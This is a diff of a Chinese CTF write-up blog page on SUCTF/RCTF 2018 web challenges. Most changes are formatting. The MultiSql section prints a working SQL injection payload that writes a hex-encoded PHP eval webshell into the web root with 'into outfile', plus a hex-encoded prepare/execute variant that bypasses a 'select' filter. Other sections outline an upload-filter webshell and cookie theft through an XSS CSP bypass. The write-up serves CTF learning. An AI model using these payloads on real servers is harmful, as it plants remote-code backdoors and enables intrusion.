@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2018/05/28/suctfwp/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
 <meta property="og:description" content="周末做了点su rctf的当时没看 整理下">
-<meta property="og:updated_time" content="2018-06-22T13:26:07.998Z">
+<meta property="og:updated_time" content="2018-06-23T04:47:59.592Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="suctfwp">
 <meta name="twitter:description" content="周末做了点su rctf的当时没看 整理下">
@@ -341,18 +341,18 @@
 <p><a href="https://paper.seebug.org/94/" target="_blank" rel="external">https://paper.seebug.org/94/</a></p>
 <p>看了bendawanag的wp原来可以直接burp爆破匿名函数末位。。。</p>
 <h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>upload getshell</p>
-<p>无字母数字的方式构造webshell 以前看过ph师傅的文章 比赛时没想起来</p>
+<p><strong>无字母数字的方式构造webshell</strong> 以前看过ph师傅的文章 比赛时没想起来</p>
 <p>源码给了</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="variable">$contents</span>=file_get_contents(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]))&#123;</div><div class="line">    <span class="variable">$data</span>=substr(<span class="variable">$contents</span>,5);</div><div class="line">    foreach (<span class="variable">$black_char</span> as <span class="variable">$b</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (stripos(<span class="variable">$data</span>, <span class="variable">$b</span>) !== <span class="literal">false</span>)&#123;</div><div class="line">            die(<span class="string">"illegal char"</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;     </div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>意思是从第六个字符起开始过滤</p>
-<p>得先fuzz看下哪些没在黑名单里面</p>
+<p>得<strong>先fuzz看下哪些没在黑名单里面</strong></p>
 <p>然后构造webshell</p>
 <h3 id="MultiSql"><a href="#MultiSql" class="headerlink" title="MultiSql"></a>MultiSql</h3><p>首先盲注拿到root用户</p>
-<p>然后 load_file注入看文件</p>
-<p>读 user.php 发现是用mysqli_multi_query()函数来进行sql语句查询的 可以多语句执行</p>
+<p>然后 <strong>load_file注入</strong>看文件</p>
+<p>读 user.php 发现是用<strong>mysqli_multi_query()函数</strong>来进行sql语句查询的 可以多语句执行</p>
 <p>读waf.php select被过滤</p>
 <p>可以用 set和hex编码方式绕过</p>
-<p>经过 into outfile方式将php文件写进网站目录 </p>
+<p>经过 <strong>into outfile</strong>方式将php文件写进网站目录 </p>
 <p>select 0x3c3f706870206576616c28245f524551554553545b273535333332275d293b3f3e into outfile ‘/var/www/html/favicon/wfox.php’</p>
 <p>再hex编码</p>
 <p>set @num=0x73656c65637420307833633366373036383730323036353736363136633238323435663532343535313535343535333534356232373335333533333333333232373564323933623366336520696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f77666f782e70687027;prepare t from @num;execute t;</p>
@@ -370,6 +370,7 @@
 <p><a href="https://lorexxar.cn/2018/05/23/rctf2018/#r-cursive" target="_blank" rel="external">https://lorexxar.cn/2018/05/23/rctf2018/#r-cursive</a></p>
 <p><a href="https://blog.csdn.net/Jerryzhu369/article/details/80432848" target="_blank" rel="external">https://blog.csdn.net/Jerryzhu369/article/details/80432848</a></p>
 <p><a href="https://www.anquanke.com/post/id/145885" target="_blank" rel="external">https://www.anquanke.com/post/id/145885</a></p>
+<p>web考察偏重前端的知识点（xss）</p>
 <h3 id="web-amp"><a href="#web-amp" class="headerlink" title="web  amp"></a>web  amp</h3><p>cookie提示flag在admin的cookie 应该是xss</p>
 <p>猜测使用AMP特性绕过csp打到cookie</p>
 <p><a href="https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id" target="_blank" rel="external">https://github.com/ampproject/amphtml/blob/master/spec/amp-var-substitutions.md#client-id</a></p>
